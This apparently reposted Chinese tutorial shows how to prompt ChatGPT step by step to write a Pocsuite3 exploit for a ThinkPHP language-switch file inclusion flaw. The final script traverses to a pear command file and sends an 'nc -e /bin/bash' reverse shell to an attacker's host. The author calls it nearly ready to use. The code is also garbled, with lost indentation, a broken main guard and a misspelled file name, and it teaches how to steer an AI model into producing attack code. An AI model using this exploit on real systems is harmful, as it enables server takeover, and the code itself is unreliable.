#  【超详细】ChatGPT & Pocsuite3梦幻联动快速编写EXP（建议收藏）

aka_zz  [ 渗透Xiao白帽 ](javascript:void\(0\);)

**渗透Xiao白帽** ![]()

微信号 SuPejkj

功能介绍 积硅步以致千里，积怠惰以致深渊！

____

___发表于_

收录于合集



  

 **前言**

  



这一模型可以与人类进行谈话般的交互，可以回答追问，连续性的问题，承认其回答中的错误，指出人类提问时的不正确前提，拒绝回答不适当的问题。

简单来说，ChatGPT是一个AI，能够分析我们题出的问题，并且对此做出解答。可以通过ChatGPT来分析代码，或者让其根据我们的需求写出相应的代码，如下。

![](https://gitee.com/fuli009/images/raw/master/public/20230215145844.png)所以，我就在想，能不能让它给我们编写poc，简化平时的一个工作，于是便有了这篇文章。

##



  

 **分析**

  

我发现，ChatGPT缓存了当此询问的结果，当我们前后两个问题相似的时候，ChatGPT会去分析两个问题的一个相似度，如果相似度过高，则会返回上一次分析的结果。而且对于有歧义的语句，其处理结果误差比较大，所以我们可以一开始给出一个简单的语句，然后通过逐步的训练，让其结果更加符合我们的预期。

###



  

 **过程**

  



#### 原理

在一开始，最好向CG(ChatGPT的简称)提供漏洞的相关原理，但是由我们直接去叙述，其准确性比较低，因为语言存在歧义，那么，我们可以通过引导的方式，去让CG了解和漏洞有关的信息，比如ThinkPHP最新的漏洞原理是因为多语言模式的开启导致的文件包含，如果我们直接询问。

![](https://gitee.com/fuli009/images/raw/master/public/20230215145900.png)

我们会发现，CG无法为我们解析出来，因为其实在这里lang_switch_on是config.php返回数组中的一个键名，准确来说并不是参数，所以这里解析才会出错。我们知道config.php会返回一个数组，但是CG因为并不会去解析config.php,所以在它并不觉得config.php会返回什么。

![](https://gitee.com/fuli009/images/raw/master/public/20230215145901.png)  
但是我们换一种方法，我们询问，

![](https://gitee.com/fuli009/images/raw/master/public/20230215145902.png)  
我们会发现，CG给出了我们一个流程，那么在这里，CG就记住了这一答案，当我们在漏洞原理中加入了这句话，那么CG就能正确解析。

#### 分段

当我们直接通过一大段话让其给我们编写程序的时候，你会发现会有很多错误，如下。  
![](https://gitee.com/fuli009/images/raw/master/public/20230215145903.png)

根据我上面的发现，我突然想 ，我们可以先给出一个简单的需求，在后面不断基于之前给的答案，增加其准确度就行。如下。

首先，询问是否知道pocsuite，并要求给出一个例子。

![](https://gitee.com/fuli009/images/raw/master/public/20230215145904.png)

    
    
    import pocsuite3  
    from pocsuite3.api import requests as req  
    from pocsuite3.api import register_poc  
    from pocsuite3.api import Output, POCBase  
      
      
    class TestPOC(POCBase):  
        vulID = '12345'  
        version = '1.0'  
        author = 'test'  
        vulDate = '2022-01-01'  
        createDate = '2022-01-01'  
        updateDate = '2022-01-01'  
        references = ['https://example.com/vul/12345']  
        name = 'Test POC'  
        appPowerLink = 'https://example.com'  
        appName = 'Test'  
        appVersion = '1.0'  
        vulType = 'Test Vul'  
        desc = '''Test POC Description'''  
        samples = ['']  
      
        def _attack(self):  
            # your code here  
            pass  
      
        def _verify(self):  
            # your code here  
            result = {}  
            return self.parse_output(result)  
      
        def parse_output(self, result):  
            output = Output(self)  
            # your code here  
            return output  
      
      
    def main():  
        register_poc(TestPOC)  
      
      
    if __name__ == '__main__':  
        main()  
    

接着，添加对漏洞的描述，要求其改进。  
  

    
    
    import pocsuite3  
    from pocsuite3.api import requests as req  
    from pocsuite3.api import register_poc  
    from pocsuite3.api import Output, POCBase  
      
      
    class ThinkPHP5_File_Inclusion(POCBase):  
        vulID = '12345'  
        version = '1.0'  
        author = 'test'  
        vulDate = '2022-01-01'  
        createDate = '2022-01-01'  
        updateDate = '2022-01-01'  
        references = ['https://example.com/vul/12345']  
        name = 'ThinkPHP5 File Inclusion Vulnerability'  
        appPowerLink = 'https://thinkphp.cn'  
        appName = 'ThinkPHP'  
        appVersion = '5.0'  
        vulType = 'File Inclusion'  
        desc = '''  
        This POC checks for a file inclusion vulnerability in ThinkPHP 5.0.  
        To exploit this vulnerability, the LANG_SWITCH_ON value in the config.php file must be set to true,  
        and a malicious lang parameter must be passed in the URL.  
        '''  
        samples = ['']  
      
        def _attack(self):  
            # your code here  
            pass  
      
        def _verify(self):  
            result = {}  
            # your code here  
            return self.parse_output(result)  
      
        def parse_output(self, result):  
            output = Output(self)  
    

这时候，我们再添加一些信息。

![](https://gitee.com/fuli009/images/raw/master/public/20230215145905.png)

    
    
    import pocsuite3  
    from pocsuite3.api import requests as req  
    from pocsuite3.api import register_poc  
    from pocsuite3.api import Output, POCBase  
      
    class ThinkPHP5_File_Inclusion(POCBase):  
    vulID = '12345'  
    version = '1.0'  
    author = 'test'  
    vulDate = '2022-12-09'  
    createDate = '2022-12-09'  
    updateDate = '2022-12-09'  
    references = ['https://tttang.com/archive/1865/']  
    name = 'ThinkPHP5 File Inclusion Vulnerability'  
    appPowerLink = 'https://thinkphp.cn'  
    appName = 'ThinkPHP'  
    appVersion = '5.0'  
    vulType = 'File Inclusion'  
    desc = '''  
    This POC checks for a file inclusion vulnerability in ThinkPHP 5.0.  
    To exploit this vulnerability, the LANG_SWITCH_ON value in the config.php file must be set to true,  
    and a malicious lang parameter must be passed in the URL. This can allow an attacker to include the  
    phearcmd.php file and execute arbitrary commands.  
    '''  
    samples = ['']  
      
    def _attack(self):  
        # your code here  
        pass  
      
    def _verify(self):  
        result = {}  
        # your code here  
        # send a request with a malicious lang parameter  
        url = self.url + '?lang=../phearcmd.php'  
        r = req.get(url)  
      
        # check if the phearcmd.php file was included  
        if 'PhearCommand execution' in r.text:  
            result['VerifyInfo'] = {}  
            result['VerifyInfo']['URL'] = url  
      
        return self.parse_output(result)  
      
    def parse_output(self, result):  
        output = Output(self)  
        if result:  
            output.success(result)  
        else:  
            output.fail('The vulnerability could not be verified')  
        return output  
      
    def main():  
    register_poc(ThinkPHP5_File_Inclusion)  
      
    if name == 'main':  
    main()  
    

最后，我们再补充一点。

![](https://gitee.com/fuli009/images/raw/master/public/20230215145906.png)

    
    
    import pocsuite3  
    from pocsuite3.api import requests as req  
    from pocsuite3.api import register_poc  
    from pocsuite3.api import Output, POCBase  
      
    class ThinkPHP5_File_Inclusion(POCBase):  
    vulID = '12345'  
    version = '1.0'  
    author = 'test'  
    vulDate = '2022-12-09'  
    createDate = '2022-12-09'  
    updateDate = '2022-12-09'  
    references = ['https://tttang.com/archive/1865/']  
    name = 'ThinkPHP5 File Inclusion Vulnerability'  
    appPowerLink = 'https://thinkphp.cn'  
    appName = 'ThinkPHP'  
    appVersion = '5.0'  
    vulType = 'File Inclusion'  
    desc = '''  
    This POC checks for a file inclusion vulnerability in ThinkPHP 5.0.  
    To exploit this vulnerability, the LANG_SWITCH_ON value in the config.php file must be set to true,  
    and a malicious lang parameter must be passed in the URL. This can allow an attacker to include the  
    phearcmd.php file and execute arbitrary commands, including a reverse shell.  
    '''  
    samples = ['']  
      
    def _attack(self):  
        # your code here  
        # send a request with a malicious lang parameter to include phearcmd.php  
        url = self.url + '?lang=../phearcmd.php'  
        r = req.get(url)  
      
        # check if the phearcmd.php file was included  
        if 'PhearCommand execution' in r.text:  
            # send a request to execute a reverse shell command  
            command = 'php -r "system(\'nc -e /bin/bash {0} {1}\');"'.format(self.options.get('lhost'), self.options.get('lport'))  
            url = self.url + '?phearcmd=' + command  
            req.get(url)  
      
    def _verify(self):  
        result = {}  
        # your code here  
        return self.parse_output(result)  
      
    def parse_output(self, result):  
        output = Output(self)  
        # no output is necessary for this POC  
        return output  
      
    def main():  
    register_poc(ThinkPHP5_File_Inclusion)  
      
    if name == 'main':  
    main()  
    

到这里，基本上就可以拿来改改就能直接使用了。

##



  

 **结论**

  



通过以上的利用和分析，我们能感受到CG的一个强大，当CG对于我们的一个问题的解决结果误差较大的时候，我们可以逐步进行求解，让其引擎对结果进行不断的修正，这样最终的结果误差较小。以上只是一个简单的案例，还有更多的可能等待挖掘。

 _ **本文作者：aka_zz，  转载请注明来自FreeBuf.COM**_

 ** _仅用于学习交流，不得用于非法用途_**

 _ **如侵权请私聊公众号删文**_

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

